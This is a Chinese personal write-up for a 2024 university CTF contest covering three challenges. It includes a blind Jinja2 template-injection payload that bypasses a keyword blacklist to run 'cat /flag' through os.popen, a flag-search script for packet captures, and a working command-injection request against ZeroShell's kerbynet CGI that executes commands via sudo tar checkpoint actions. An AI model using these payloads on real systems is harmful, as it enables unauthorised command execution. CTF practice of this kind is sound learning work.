---
title: 第十八届全国大学生信息安全竞赛（创新实践能力赛）暨第二届“长城杯”铁人三项赛（防护赛）个人WP
description: 本次长城杯共解出3道题，总计150分，其中一道WEB安全，两道威胁检测与网络流量分析。
date: 2024-12-16
image: cover.png
categories:
    - cate3
tags:
    - CTF
    - WP
---

## WEB 安全 

### Safe_Proxy

​	获取题目后访问到如下页面： 

![img](/clip_image002.jpg) 

​	审计代码可知，其中的函数： 

```python
@app.route('/', methods=["POST"])
def template():
    template_code = request.form.get("code")
    # 安全过滤
    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']
    for black in blacklist:
        if black in template_code:
            return "Forbidden content detected!"
    result = render_template_string(template_code)
    print(result)
    return 'ok' if result is not None else 'error'
```

​	判断存在模板注入漏洞，且没有回显，所以判断为盲注，那么构造 payload： 

```python
{%set+allchar="abcdefghijklmnopqrstuvwxyz0123456789!@#$%^%26*()-_+{}[]|:;?/><.,ABCDEFGHIJKLMNOPQRSTUVWXYZ"%}{%set+a='o'+'s'%}
{%set+b='p o'+'pen'%}
{%set+res=url_for['\x5f\x5fglobals\x5f\x5f'][a][b]('cat+/flag').read()%}
{%if+res[2]==allchar[0]%}
	{%print(1)%}
{%else%}
	{%print(sleep(1))%}
{%endif%}
```

​	使用该 payload 可以爆破出 flag。爆破后得到如下数据，其中长度 80 的包为包含 flag 字符的数据包： 

![img](/clip_image004.jpg) 

​	使用如下脚本处理数据： 

```python
x='abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+{}[]|:;?/><.,ABCDEFGHIJKLMNOPQRSTUVWXYZ'
def read_and_process_data(file_path):
    extracted_data = []
    with open(file_path, mode='r', encoding='utf-8') as file:
        for line in file:
            parts = line.strip().split('\t')
            if len(parts) >= 3:
                second_col = parts[1]
                third_col = int(parts[2])
                extracted_data.append((second_col, third_col))
    sorted_data = sorted(extracted_data, key=lambda x: int(x[0]))
    #print(sorted_data)
    return sorted_data
def write_to_file(ascii_data, output_file):
    with open(output_file, mode='w', encoding='utf-8') as file:
        file.write(''.join(ascii_data))
def main():
    input_file = 'data.txt'
    #output_file = 'res.txt'
    sorted_data = read_and_process_data(input_file)
    print(sorted_data)
    for _i,k in sorted_data:
        print(x[k],end='')

if __name__ == "__main__":
    main()
```

​	得到 flag： 

![img](/clip_image005.jpg) 

## 威胁检测与网络流量分析 

### zeroshell_1

​	打开解压后的流量包后使用如下脚本查找流量包中的 flag： 

```python
# encoding:utf-8
import os
import os.path
import sys
import subprocess
# 打印可打印字符串
def str_re(str1):
    str2 = ""
    for i in str1.decode('utf8', 'ignore'):
        try:
            # print(ord(i))
            if ord(i) <= 126 and ord(i) >= 33:
                str2 += i
        except:
            str2 += ""
    # print(str2)
    return str2
# 写入文本函数
def txt_wt(name, txt1):
    with open("output.txt", "a") as f:
        f.write('filename:' + name)
        f.write("\n")
        f.write('flag:' + txt1)
        f.write("\n")
# 第一次运行，清空output文件
def clear_txt():
    with open("output.txt", "w") as f:
        print("clear output.txt！！！")
# 递归遍历的所有文件
def file_bianli():
    # 路径设置为当前目录
    path = os.getcwd()
    # 返回文件下的所有文件列表
    file_list = []
    for i, j, k in os.walk(path):
        for dd in k:
            if ".py" not in dd and "output.txt" not in dd:
                file_list.append(os.path.join(i, dd))
    return file_list
# 查找文件中可能为flag的字符串
def flag(file_list, flag):
    for i in file_list:
        try:
            with open(i, "rb") as f:
                for j in f.readlines():
                    j1 = str_re(j)  # 可打印字符串
                    # print j1
                    for k in flag:
                        if k in j1:
                            txt_wt(i, j1)
                            print('filename:', i)
                            print('flag:', j1)
        except:
            print('err')
#这里可以自行添加一些flag编码后的形式
flag_txt = ['flag{', '666c6167', 'flag', 'Zmxh', '&#102', '666C6167']
# 清空输出的文本文件
clear_txt()
# 遍历文件名
file_lt = file_bianli()
# 查找flag关键字
flag(file_lt, flag_txt)
```

![img](/clip_image009.jpg) 

​	将输入进行 base64 解码后得到 flag： 

flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A} 

### zeroshell_2 

​	启动虚拟机后访问 [http://61.139.2.100](http://61.139.2.100/) [进](http://61.139.2.100/)入如下页面： 

![img](/clip_image011.jpg) 

​	根据流量包中的信息可知漏洞位于：/cgi-bin/kerbynet 中。 访问后抓包： 

```http
GET / HTTP/1.1 
Host: 61.139.2.100 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 
If-None-Match: "12e9a-363-56d7136d1bb80" 
If-Modified-Since: Wed, 30 May 2018 19:18:22 GMT 
Connection: close 
```

​	构造路由： 

```http
GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpointaction=exec='ps%20-ef'%0A' HTTP/1.1
Host: 61.139.2.100 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 
If-None-Match: "12e9a-363-56d7136d1bb80" 
If-Modified-Since: Wed, 30 May 2018 19:18:22 GMT Connection: close
```

​	发送数据包，可见命令成功执行：

![img](/clip_image013.jpg) 

​	根据要求查找 flag 文件，输入命令： 

```bash
find / -name flag 
```

![img](/clip_image015.jpg) 

​	找到 flag 文件，查看 flag 文件，得到 flag: 

c6045425-6e6e-41d0-be09-95682a4f65c4 

​	包裹上 flag{}: 

flag{c6045425-6e6e-41d0-be09-95682a4f65c4} 